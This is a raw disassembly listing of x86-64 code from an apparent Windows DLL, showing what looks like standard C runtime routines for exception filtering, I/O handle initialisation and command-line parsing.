   180008fd6:	48 8d 3d 33 0a 01 00 	lea    0x10a33(%rip),%rdi        # 0x180019a10
   180008fdd:	48 39 3d 1c 0a 01 00 	cmp    %rdi,0x10a1c(%rip)        # 0x180019a00
   180008fe4:	74 2b                	je     0x180009011
   180008fe6:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180008feb:	e8 1c 1d 00 00       	call   0x18000ad0c
   180008ff0:	90                   	nop
   180008ff1:	48 8b d7             	mov    %rdi,%rdx
   180008ff4:	48 8d 0d 05 0a 01 00 	lea    0x10a05(%rip),%rcx        # 0x180019a00
   180008ffb:	e8 44 f2 ff ff       	call   0x180008244
   180009000:	48 89 05 f9 09 01 00 	mov    %rax,0x109f9(%rip)        # 0x180019a00
   180009007:	b9 0c 00 00 00       	mov    $0xc,%ecx
   18000900c:	e8 eb 1e 00 00       	call   0x18000aefc
   180009011:	48 83 c4 20          	add    $0x20,%rsp
   180009015:	5f                   	pop    %rdi
   180009016:	c3                   	ret
   180009017:	cc                   	int3
   180009018:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000901d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180009022:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180009027:	57                   	push   %rdi
   180009028:	48 83 ec 20          	sub    $0x20,%rsp
   18000902c:	48 8b f2             	mov    %rdx,%rsi
   18000902f:	8b f9                	mov    %ecx,%edi
   180009031:	e8 ae fd ff ff       	call   0x180008de4
   180009036:	45 33 c9             	xor    %r9d,%r9d
   180009039:	48 8b d8             	mov    %rax,%rbx
   18000903c:	48 85 c0             	test   %rax,%rax
   18000903f:	0f 84 88 01 00 00    	je     0x1800091cd
   180009045:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   18000904c:	48 8b ca             	mov    %rdx,%rcx
   18000904f:	39 39                	cmp    %edi,(%rcx)
   180009051:	74 10                	je     0x180009063
   180009053:	48 8d 82 c0 00 00 00 	lea    0xc0(%rdx),%rax
   18000905a:	48 83 c1 10          	add    $0x10,%rcx
   18000905e:	48 3b c8             	cmp    %rax,%rcx
   180009061:	72 ec                	jb     0x18000904f
   180009063:	48 8d 82 c0 00 00 00 	lea    0xc0(%rdx),%rax
   18000906a:	48 3b c8             	cmp    %rax,%rcx
   18000906d:	73 04                	jae    0x180009073
   18000906f:	39 39                	cmp    %edi,(%rcx)
   180009071:	74 03                	je     0x180009076
   180009073:	49 8b c9             	mov    %r9,%rcx
   180009076:	48 85 c9             	test   %rcx,%rcx
   180009079:	0f 84 4e 01 00 00    	je     0x1800091cd
   18000907f:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   180009083:	4d 85 c0             	test   %r8,%r8
   180009086:	0f 84 41 01 00 00    	je     0x1800091cd
   18000908c:	49 83 f8 05          	cmp    $0x5,%r8
   180009090:	75 0d                	jne    0x18000909f
   180009092:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   180009096:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   18000909a:	e9 30 01 00 00       	jmp    0x1800091cf
   18000909f:	49 83 f8 01          	cmp    $0x1,%r8
   1800090a3:	75 08                	jne    0x1800090ad
   1800090a5:	83 c8 ff             	or     $0xffffffff,%eax
   1800090a8:	e9 22 01 00 00       	jmp    0x1800091cf
   1800090ad:	48 8b ab a8 00 00 00 	mov    0xa8(%rbx),%rbp
   1800090b4:	48 89 b3 a8 00 00 00 	mov    %rsi,0xa8(%rbx)
   1800090bb:	83 79 04 08          	cmpl   $0x8,0x4(%rcx)
   1800090bf:	0f 85 f2 00 00 00    	jne    0x1800091b7
   1800090c5:	ba 30 00 00 00       	mov    $0x30,%edx
   1800090ca:	48 8b 83 a0 00 00 00 	mov    0xa0(%rbx),%rax
   1800090d1:	48 83 c2 10          	add    $0x10,%rdx
   1800090d5:	4c 89 4c 02 f8       	mov    %r9,-0x8(%rdx,%rax,1)
   1800090da:	48 81 fa c0 00 00 00 	cmp    $0xc0,%rdx
   1800090e1:	7c e7                	jl     0x1800090ca
   1800090e3:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%rcx)
   1800090e9:	8b bb b0 00 00 00    	mov    0xb0(%rbx),%edi
   1800090ef:	75 0f                	jne    0x180009100
   1800090f1:	c7 83 b0 00 00 00 83 	movl   $0x83,0xb0(%rbx)
   1800090f8:	00 00 00 
   1800090fb:	e9 a1 00 00 00       	jmp    0x1800091a1
   180009100:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%rcx)
   180009106:	75 0f                	jne    0x180009117
   180009108:	c7 83 b0 00 00 00 81 	movl   $0x81,0xb0(%rbx)
   18000910f:	00 00 00 
   180009112:	e9 8a 00 00 00       	jmp    0x1800091a1
   180009117:	81 39 91 00 00 c0    	cmpl   $0xc0000091,(%rcx)
   18000911d:	75 0c                	jne    0x18000912b
   18000911f:	c7 83 b0 00 00 00 84 	movl   $0x84,0xb0(%rbx)
   180009126:	00 00 00 
   180009129:	eb 76                	jmp    0x1800091a1
   18000912b:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%rcx)
   180009131:	75 0c                	jne    0x18000913f
   180009133:	c7 83 b0 00 00 00 85 	movl   $0x85,0xb0(%rbx)
   18000913a:	00 00 00 
   18000913d:	eb 62                	jmp    0x1800091a1
   18000913f:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%rcx)
   180009145:	75 0c                	jne    0x180009153
   180009147:	c7 83 b0 00 00 00 82 	movl   $0x82,0xb0(%rbx)
   18000914e:	00 00 00 
   180009151:	eb 4e                	jmp    0x1800091a1
   180009153:	81 39 8f 00 00 c0    	cmpl   $0xc000008f,(%rcx)
   180009159:	75 0c                	jne    0x180009167
   18000915b:	c7 83 b0 00 00 00 86 	movl   $0x86,0xb0(%rbx)
   180009162:	00 00 00 
   180009165:	eb 3a                	jmp    0x1800091a1
   180009167:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%rcx)
   18000916d:	75 0c                	jne    0x18000917b
   18000916f:	c7 83 b0 00 00 00 8a 	movl   $0x8a,0xb0(%rbx)
   180009176:	00 00 00 
   180009179:	eb 26                	jmp    0x1800091a1
   18000917b:	81 39 b5 02 00 c0    	cmpl   $0xc00002b5,(%rcx)
   180009181:	75 0c                	jne    0x18000918f
   180009183:	c7 83 b0 00 00 00 8d 	movl   $0x8d,0xb0(%rbx)
   18000918a:	00 00 00 
   18000918d:	eb 12                	jmp    0x1800091a1
   18000918f:	81 39 b4 02 00 c0    	cmpl   $0xc00002b4,(%rcx)
   180009195:	75 0a                	jne    0x1800091a1
   180009197:	c7 83 b0 00 00 00 8e 	movl   $0x8e,0xb0(%rbx)
   18000919e:	00 00 00 
   1800091a1:	8b 93 b0 00 00 00    	mov    0xb0(%rbx),%edx
   1800091a7:	b9 08 00 00 00       	mov    $0x8,%ecx
   1800091ac:	41 ff d0             	call   *%r8
   1800091af:	89 bb b0 00 00 00    	mov    %edi,0xb0(%rbx)
   1800091b5:	eb 0a                	jmp    0x1800091c1
   1800091b7:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   1800091bb:	8b 49 04             	mov    0x4(%rcx),%ecx
   1800091be:	41 ff d0             	call   *%r8
   1800091c1:	48 89 ab a8 00 00 00 	mov    %rbp,0xa8(%rbx)
   1800091c8:	e9 d8 fe ff ff       	jmp    0x1800090a5
   1800091cd:	33 c0                	xor    %eax,%eax
   1800091cf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800091d4:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800091d9:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1800091de:	48 83 c4 20          	add    $0x20,%rsp
   1800091e2:	5f                   	pop    %rdi
   1800091e3:	c3                   	ret
   1800091e4:	b8 63 73 6d e0       	mov    $0xe06d7363,%eax
   1800091e9:	3b c8                	cmp    %eax,%ecx
   1800091eb:	75 07                	jne    0x1800091f4
   1800091ed:	8b c8                	mov    %eax,%ecx
   1800091ef:	e9 24 fe ff ff       	jmp    0x180009018
   1800091f4:	33 c0                	xor    %eax,%eax
   1800091f6:	c3                   	ret
   1800091f7:	cc                   	int3
   1800091f8:	48 8b c4             	mov    %rsp,%rax
   1800091fb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800091ff:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180009203:	48 89 78 18          	mov    %rdi,0x18(%rax)
   180009207:	4c 89 60 20          	mov    %r12,0x20(%rax)
   18000920b:	41 55                	push   %r13
   18000920d:	41 56                	push   %r14
   18000920f:	41 57                	push   %r15
   180009211:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   180009218:	48 89 64 24 48       	mov    %rsp,0x48(%rsp)
   18000921d:	b9 0b 00 00 00       	mov    $0xb,%ecx
   180009222:	e8 e5 1a 00 00       	call   0x18000ad0c
   180009227:	90                   	nop
   180009228:	bf 58 00 00 00       	mov    $0x58,%edi
   18000922d:	8b d7                	mov    %edi,%edx
   18000922f:	44 8d 6f c8          	lea    -0x38(%rdi),%r13d
   180009233:	41 8b cd             	mov    %r13d,%ecx
   180009236:	e8 09 0f 00 00       	call   0x18000a144
   18000923b:	48 8b c8             	mov    %rax,%rcx
   18000923e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180009243:	45 33 e4             	xor    %r12d,%r12d
   180009246:	48 85 c0             	test   %rax,%rax
   180009249:	75 19                	jne    0x180009264
   18000924b:	48 8d 15 0a 00 00 00 	lea    0xa(%rip),%rdx        # 0x18000925c
   180009252:	48 8b cc             	mov    %rsp,%rcx
   180009255:	e8 b6 34 00 00       	call   0x18000c710
   18000925a:	90                   	nop
   18000925b:	90                   	nop
   18000925c:	83 c8 ff             	or     $0xffffffff,%eax
   18000925f:	e9 9f 02 00 00       	jmp    0x180009503
   180009264:	48 89 05 15 22 01 00 	mov    %rax,0x12215(%rip)        # 0x18001b480
   18000926b:	44 89 2d 36 39 01 00 	mov    %r13d,0x13936(%rip)        # 0x18001cba8
   180009272:	48 05 00 0b 00 00    	add    $0xb00,%rax
   180009278:	48 3b c8             	cmp    %rax,%rcx
   18000927b:	73 39                	jae    0x1800092b6
   18000927d:	66 c7 41 08 00 0a    	movw   $0xa00,0x8(%rcx)
   180009283:	48 83 09 ff          	orq    $0xffffffffffffffff,(%rcx)
   180009287:	44 89 61 0c          	mov    %r12d,0xc(%rcx)
   18000928b:	80 61 38 80          	andb   $0x80,0x38(%rcx)
   18000928f:	8a 41 38             	mov    0x38(%rcx),%al
   180009292:	24 7f                	and    $0x7f,%al
   180009294:	88 41 38             	mov    %al,0x38(%rcx)
   180009297:	66 c7 41 39 0a 0a    	movw   $0xa0a,0x39(%rcx)
   18000929d:	44 89 61 50          	mov    %r12d,0x50(%rcx)
   1800092a1:	44 88 61 4c          	mov    %r12b,0x4c(%rcx)
   1800092a5:	48 03 cf             	add    %rdi,%rcx
   1800092a8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800092ad:	48 8b 05 cc 21 01 00 	mov    0x121cc(%rip),%rax        # 0x18001b480
   1800092b4:	eb bc                	jmp    0x180009272
   1800092b6:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800092bb:	ff 15 77 7e 00 00    	call   *0x7e77(%rip)        # 0x180011138
   1800092c1:	66 44 39 a4 24 92 00 	cmp    %r12w,0x92(%rsp)
   1800092c8:	00 00 
   1800092ca:	0f 84 42 01 00 00    	je     0x180009412
   1800092d0:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   1800092d7:	00 
   1800092d8:	48 85 c0             	test   %rax,%rax
   1800092db:	0f 84 31 01 00 00    	je     0x180009412
   1800092e1:	4c 8d 70 04          	lea    0x4(%rax),%r14
   1800092e5:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1800092ea:	48 63 30             	movslq (%rax),%rsi
   1800092ed:	49 03 f6             	add    %r14,%rsi
   1800092f0:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1800092f5:	41 bf 00 08 00 00    	mov    $0x800,%r15d
   1800092fb:	44 39 38             	cmp    %r15d,(%rax)
   1800092fe:	44 0f 4c 38          	cmovl  (%rax),%r15d
   180009302:	bb 01 00 00 00       	mov    $0x1,%ebx
   180009307:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   18000930b:	44 39 3d 96 38 01 00 	cmp    %r15d,0x13896(%rip)        # 0x18001cba8
   180009312:	7d 73                	jge    0x180009387
   180009314:	48 8b d7             	mov    %rdi,%rdx
   180009317:	49 8b cd             	mov    %r13,%rcx
   18000931a:	e8 25 0e 00 00       	call   0x18000a144
   18000931f:	48 8b c8             	mov    %rax,%rcx
   180009322:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180009327:	48 85 c0             	test   %rax,%rax
   18000932a:	75 09                	jne    0x180009335
   18000932c:	44 8b 3d 75 38 01 00 	mov    0x13875(%rip),%r15d        # 0x18001cba8
   180009333:	eb 52                	jmp    0x180009387
   180009335:	48 63 d3             	movslq %ebx,%rdx
   180009338:	4c 8d 05 41 21 01 00 	lea    0x12141(%rip),%r8        # 0x18001b480
   18000933f:	49 89 04 d0          	mov    %rax,(%r8,%rdx,8)
   180009343:	44 01 2d 5e 38 01 00 	add    %r13d,0x1385e(%rip)        # 0x18001cba8
   18000934a:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   18000934e:	48 05 00 0b 00 00    	add    $0xb00,%rax
   180009354:	48 3b c8             	cmp    %rax,%rcx
   180009357:	73 2a                	jae    0x180009383
   180009359:	66 c7 41 08 00 0a    	movw   $0xa00,0x8(%rcx)
   18000935f:	48 83 09 ff          	orq    $0xffffffffffffffff,(%rcx)
   180009363:	44 89 61 0c          	mov    %r12d,0xc(%rcx)
   180009367:	80 61 38 80          	andb   $0x80,0x38(%rcx)
   18000936b:	66 c7 41 39 0a 0a    	movw   $0xa0a,0x39(%rcx)
   180009371:	44 89 61 50          	mov    %r12d,0x50(%rcx)
   180009375:	44 88 61 4c          	mov    %r12b,0x4c(%rcx)
   180009379:	48 03 cf             	add    %rdi,%rcx
   18000937c:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180009381:	eb c7                	jmp    0x18000934a
   180009383:	ff c3                	inc    %ebx
   180009385:	eb 80                	jmp    0x180009307
   180009387:	41 8b fc             	mov    %r12d,%edi
   18000938a:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   18000938f:	4c 8d 2d ea 20 01 00 	lea    0x120ea(%rip),%r13        # 0x18001b480
   180009396:	41 3b ff             	cmp    %r15d,%edi
   180009399:	7d 77                	jge    0x180009412
   18000939b:	48 8b 0e             	mov    (%rsi),%rcx
   18000939e:	48 8d 41 02          	lea    0x2(%rcx),%rax
   1800093a2:	48 83 f8 01          	cmp    $0x1,%rax
   1800093a6:	76 51                	jbe    0x1800093f9
   1800093a8:	41 f6 06 01          	testb  $0x1,(%r14)
   1800093ac:	74 4b                	je     0x1800093f9
   1800093ae:	41 f6 06 08          	testb  $0x8,(%r14)
   1800093b2:	75 0a                	jne    0x1800093be
   1800093b4:	ff 15 6e 7d 00 00    	call   *0x7d6e(%rip)        # 0x180011128
   1800093ba:	85 c0                	test   %eax,%eax
   1800093bc:	74 3b                	je     0x1800093f9
   1800093be:	48 63 cf             	movslq %edi,%rcx
   1800093c1:	48 8b c1             	mov    %rcx,%rax
   1800093c4:	48 c1 f8 05          	sar    $0x5,%rax
   1800093c8:	83 e1 1f             	and    $0x1f,%ecx
   1800093cb:	48 6b d9 58          	imul   $0x58,%rcx,%rbx
   1800093cf:	49 03 5c c5 00       	add    0x0(%r13,%rax,8),%rbx
   1800093d4:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1800093d9:	48 8b 06             	mov    (%rsi),%rax
   1800093dc:	48 89 03             	mov    %rax,(%rbx)
   1800093df:	41 8a 06             	mov    (%r14),%al
   1800093e2:	88 43 08             	mov    %al,0x8(%rbx)
   1800093e5:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   1800093e9:	45 33 c0             	xor    %r8d,%r8d
   1800093ec:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1800093f1:	e8 92 08 00 00       	call   0x180009c88
   1800093f6:	ff 43 0c             	incl   0xc(%rbx)
   1800093f9:	ff c7                	inc    %edi
   1800093fb:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1800093ff:	49 ff c6             	inc    %r14
   180009402:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   180009407:	48 83 c6 08          	add    $0x8,%rsi
   18000940b:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   180009410:	eb 84                	jmp    0x180009396
   180009412:	41 8b fc             	mov    %r12d,%edi
   180009415:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   18000941a:	49 c7 c7 fe ff ff ff 	mov    $0xfffffffffffffffe,%r15
   180009421:	83 ff 03             	cmp    $0x3,%edi
   180009424:	0f 8d cd 00 00 00    	jge    0x1800094f7
   18000942a:	48 63 f7             	movslq %edi,%rsi
   18000942d:	48 6b de 58          	imul   $0x58,%rsi,%rbx
   180009431:	48 03 1d 48 20 01 00 	add    0x12048(%rip),%rbx        # 0x18001b480
   180009438:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   18000943d:	48 8b 03             	mov    (%rbx),%rax
   180009440:	48 83 c0 02          	add    $0x2,%rax
   180009444:	48 83 f8 01          	cmp    $0x1,%rax
   180009448:	76 10                	jbe    0x18000945a
   18000944a:	0f be 43 08          	movsbl 0x8(%rbx),%eax
   18000944e:	0f ba e8 07          	bts    $0x7,%eax
   180009452:	88 43 08             	mov    %al,0x8(%rbx)
   180009455:	e9 92 00 00 00       	jmp    0x1800094ec
   18000945a:	c6 43 08 81          	movb   $0x81,0x8(%rbx)
   18000945e:	8d 47 ff             	lea    -0x1(%rdi),%eax
   180009461:	f7 d8                	neg    %eax
   180009463:	1b c9                	sbb    %ecx,%ecx
   180009465:	83 c1 f5             	add    $0xfffffff5,%ecx
   180009468:	b8 f6 ff ff ff       	mov    $0xfffffff6,%eax
   18000946d:	85 ff                	test   %edi,%edi
   18000946f:	0f 44 c8             	cmove  %eax,%ecx
   180009472:	ff 15 70 7c 00 00    	call   *0x7c70(%rip)        # 0x1800110e8
   180009478:	4c 8b f0             	mov    %rax,%r14
   18000947b:	48 8d 48 01          	lea    0x1(%rax),%rcx
   18000947f:	48 83 f9 01          	cmp    $0x1,%rcx
   180009483:	76 46                	jbe    0x1800094cb
   180009485:	48 8b c8             	mov    %rax,%rcx
   180009488:	ff 15 9a 7c 00 00    	call   *0x7c9a(%rip)        # 0x180011128
   18000948e:	85 c0                	test   %eax,%eax
   180009490:	74 39                	je     0x1800094cb
   180009492:	4c 89 33             	mov    %r14,(%rbx)
   180009495:	0f b6 c0             	movzbl %al,%eax
   180009498:	83 f8 02             	cmp    $0x2,%eax
   18000949b:	75 09                	jne    0x1800094a6
   18000949d:	0f be 43 08          	movsbl 0x8(%rbx),%eax
   1800094a1:	83 c8 40             	or     $0x40,%eax
   1800094a4:	eb 0c                	jmp    0x1800094b2
   1800094a6:	83 f8 03             	cmp    $0x3,%eax
   1800094a9:	75 0a                	jne    0x1800094b5
   1800094ab:	0f be 43 08          	movsbl 0x8(%rbx),%eax
   1800094af:	83 c8 08             	or     $0x8,%eax
   1800094b2:	88 43 08             	mov    %al,0x8(%rbx)
   1800094b5:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   1800094b9:	45 33 c0             	xor    %r8d,%r8d
   1800094bc:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1800094c1:	e8 c2 07 00 00       	call   0x180009c88
   1800094c6:	ff 43 0c             	incl   0xc(%rbx)
   1800094c9:	eb 21                	jmp    0x1800094ec
   1800094cb:	0f be 43 08          	movsbl 0x8(%rbx),%eax
   1800094cf:	83 c8 40             	or     $0x40,%eax
   1800094d2:	88 43 08             	mov    %al,0x8(%rbx)
   1800094d5:	4c 89 3b             	mov    %r15,(%rbx)
   1800094d8:	48 8b 05 79 25 01 00 	mov    0x12579(%rip),%rax        # 0x18001ba58
   1800094df:	48 85 c0             	test   %rax,%rax
   1800094e2:	74 08                	je     0x1800094ec
   1800094e4:	48 8b 04 f0          	mov    (%rax,%rsi,8),%rax
   1800094e8:	44 89 78 1c          	mov    %r15d,0x1c(%rax)
   1800094ec:	ff c7                	inc    %edi
   1800094ee:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1800094f2:	e9 2a ff ff ff       	jmp    0x180009421
   1800094f7:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1800094fc:	e8 fb 19 00 00       	call   0x18000aefc
   180009501:	33 c0                	xor    %eax,%eax
   180009503:	4c 8d 9c 24 c0 00 00 	lea    0xc0(%rsp),%r11
   18000950a:	00 
   18000950b:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   18000950f:	49 8b 73 28          	mov    0x28(%r11),%rsi
   180009513:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   180009517:	4d 8b 63 38          	mov    0x38(%r11),%r12
   18000951b:	49 8b e3             	mov    %r11,%rsp
   18000951e:	41 5f                	pop    %r15
   180009520:	41 5e                	pop    %r14
   180009522:	41 5d                	pop    %r13
   180009524:	c3                   	ret
   180009525:	cc                   	int3
   180009526:	cc                   	int3
   180009527:	cc                   	int3
   180009528:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000952d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180009532:	57                   	push   %rdi
   180009533:	48 83 ec 20          	sub    $0x20,%rsp
   180009537:	48 8d 3d 42 1f 01 00 	lea    0x11f42(%rip),%rdi        # 0x18001b480
   18000953e:	be 40 00 00 00       	mov    $0x40,%esi
   180009543:	48 8b 1f             	mov    (%rdi),%rbx
   180009546:	48 85 db             	test   %rbx,%rbx
   180009549:	74 37                	je     0x180009582
   18000954b:	48 8d 83 00 0b 00 00 	lea    0xb00(%rbx),%rax
   180009552:	eb 1d                	jmp    0x180009571
   180009554:	83 7b 0c 00          	cmpl   $0x0,0xc(%rbx)
   180009558:	74 0a                	je     0x180009564
   18000955a:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   18000955e:	ff 15 cc 7b 00 00    	call   *0x7bcc(%rip)        # 0x180011130
   180009564:	48 8b 07             	mov    (%rdi),%rax
   180009567:	48 83 c3 58          	add    $0x58,%rbx
   18000956b:	48 05 00 0b 00 00    	add    $0xb00,%rax
   180009571:	48 3b d8             	cmp    %rax,%rbx
   180009574:	72 de                	jb     0x180009554
   180009576:	48 8b 0f             	mov    (%rdi),%rcx
   180009579:	e8 02 c0 ff ff       	call   0x180005580
   18000957e:	48 83 27 00          	andq   $0x0,(%rdi)
   180009582:	48 83 c7 08          	add    $0x8,%rdi
   180009586:	48 ff ce             	dec    %rsi
   180009589:	75 b8                	jne    0x180009543
   18000958b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180009590:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180009595:	48 83 c4 20          	add    $0x20,%rsp
   180009599:	5f                   	pop    %rdi
   18000959a:	c3                   	ret
   18000959b:	cc                   	int3
   18000959c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800095a1:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800095a6:	57                   	push   %rdi
   1800095a7:	48 83 ec 30          	sub    $0x30,%rsp
   1800095ab:	83 3d 16 36 01 00 00 	cmpl   $0x0,0x13616(%rip)        # 0x18001cbc8
   1800095b2:	75 05                	jne    0x1800095b9
   1800095b4:	e8 ef ec ff ff       	call   0x1800082a8
   1800095b9:	48 8d 3d c0 20 01 00 	lea    0x120c0(%rip),%rdi        # 0x18001b680
   1800095c0:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800095c6:	33 c9                	xor    %ecx,%ecx
   1800095c8:	48 8b d7             	mov    %rdi,%rdx
   1800095cb:	c6 05 b2 21 01 00 00 	movb   $0x0,0x121b2(%rip)        # 0x18001b784
   1800095d2:	ff 15 50 7a 00 00    	call   *0x7a50(%rip)        # 0x180011028
   1800095d8:	48 8b 1d f1 35 01 00 	mov    0x135f1(%rip),%rbx        # 0x18001cbd0
   1800095df:	48 89 3d f2 17 01 00 	mov    %rdi,0x117f2(%rip)        # 0x18001add8
   1800095e6:	48 85 db             	test   %rbx,%rbx
   1800095e9:	74 05                	je     0x1800095f0
   1800095eb:	80 3b 00             	cmpb   $0x0,(%rbx)
   1800095ee:	75 03                	jne    0x1800095f3
   1800095f0:	48 8b df             	mov    %rdi,%rbx
   1800095f3:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1800095f8:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1800095fd:	45 33 c0             	xor    %r8d,%r8d
   180009600:	33 d2                	xor    %edx,%edx
   180009602:	48 8b cb             	mov    %rbx,%rcx
   180009605:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000960a:	e8 81 00 00 00       	call   0x180009690
   18000960f:	48 63 74 24 40       	movslq 0x40(%rsp),%rsi
   180009614:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   18000961b:	ff ff 1f 
   18000961e:	48 3b f1             	cmp    %rcx,%rsi
   180009621:	73 59                	jae    0x18000967c
   180009623:	48 63 4c 24 48       	movslq 0x48(%rsp),%rcx
   180009628:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   18000962c:	73 4e                	jae    0x18000967c
   18000962e:	48 8d 14 f1          	lea    (%rcx,%rsi,8),%rdx
   180009632:	48 3b d1             	cmp    %rcx,%rdx
   180009635:	72 45                	jb     0x18000967c
   180009637:	48 8b ca             	mov    %rdx,%rcx
   18000963a:	e8 85 0b 00 00       	call   0x18000a1c4
   18000963f:	48 8b f8             	mov    %rax,%rdi
   180009642:	48 85 c0             	test   %rax,%rax
   180009645:	74 35                	je     0x18000967c
   180009647:	4c 8d 04 f0          	lea    (%rax,%rsi,8),%r8
   18000964b:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   180009650:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   180009655:	48 8b d7             	mov    %rdi,%rdx
   180009658:	48 8b cb             	mov    %rbx,%rcx
   18000965b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180009660:	e8 2b 00 00 00       	call   0x180009690
   180009665:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180009669:	48 89 3d 48 17 01 00 	mov    %rdi,0x11748(%rip)        # 0x18001adb8
   180009670:	ff c8                	dec    %eax
   180009672:	89 05 3c 17 01 00    	mov    %eax,0x1173c(%rip)        # 0x18001adb4
   180009678:	33 c0                	xor    %eax,%eax
   18000967a:	eb 03                	jmp    0x18000967f
   18000967c:	83 c8 ff             	or     $0xffffffff,%eax
   18000967f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180009684:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180009689:	48 83 c4 30          	add    $0x30,%rsp
   18000968d:	5f                   	pop    %rdi
   18000968e:	c3                   	ret
   18000968f:	cc                   	int3
   180009690:	48 8b c4             	mov    %rsp,%rax
   180009693:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180009697:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000969b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000969f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800096a3:	41 54                	push   %r12
   1800096a5:	41 56                	push   %r14
   1800096a7:	41 57                	push   %r15
   1800096a9:	48 83 ec 20          	sub    $0x20,%rsp
   1800096ad:	4c 8b 74 24 60       	mov    0x60(%rsp),%r14
   1800096b2:	4d 8b e1             	mov    %r9,%r12
   1800096b5:	49 8b f8             	mov    %r8,%rdi
   1800096b8:	41 83 26 00          	andl   $0x0,(%r14)
   1800096bc:	4c 8b fa             	mov    %rdx,%r15
   1800096bf:	48 8b d9             	mov    %rcx,%rbx
   1800096c2:	41 c7 01 01 00 00 00 	movl   $0x1,(%r9)
   1800096c9:	48 85 d2             	test   %rdx,%rdx
   1800096cc:	74 07                	je     0x1800096d5
   1800096ce:	4c 89 02             	mov    %r8,(%rdx)
   1800096d1:	49 83 c7 08          	add    $0x8,%r15
   1800096d5:	33 ed                	xor    %ebp,%ebp
   1800096d7:	80 3b 22             	cmpb   $0x22,(%rbx)
   1800096da:	75 11                	jne    0x1800096ed
   1800096dc:	33 c0                	xor    %eax,%eax
   1800096de:	85 ed                	test   %ebp,%ebp
   1800096e0:	40 b6 22             	mov    $0x22,%sil
   1800096e3:	0f 94 c0             	sete   %al
   1800096e6:	48 ff c3             	inc    %rbx
   1800096e9:	8b e8                	mov    %eax,%ebp
   1800096eb:	eb 37                	jmp    0x180009724
   1800096ed:	41 ff 06             	incl   (%r14)
   1800096f0:	48 85 ff             	test   %rdi,%rdi
   1800096f3:	74 07                	je     0x1800096fc
   1800096f5:	8a 03                	mov    (%rbx),%al
   1800096f7:	88 07                	mov    %al,(%rdi)
   1800096f9:	48 ff c7             	inc    %rdi
   1800096fc:	0f b6 33             	movzbl (%rbx),%esi
   1800096ff:	48 ff c3             	inc    %rbx
   180009702:	8b ce                	mov    %esi,%ecx
   180009704:	e8 bb 32 00 00       	call   0x18000c9c4
   180009709:	85 c0                	test   %eax,%eax
   18000970b:	74 12                	je     0x18000971f
   18000970d:	41 ff 06             	incl   (%r14)
   180009710:	48 85 ff             	test   %rdi,%rdi
   180009713:	74 07                	je     0x18000971c
   180009715:	8a 03                	mov    (%rbx),%al
   180009717:	88 07                	mov    %al,(%rdi)
   180009719:	48 ff c7             	inc    %rdi
   18000971c:	48 ff c3             	inc    %rbx
   18000971f:	40 84 f6             	test   %sil,%sil
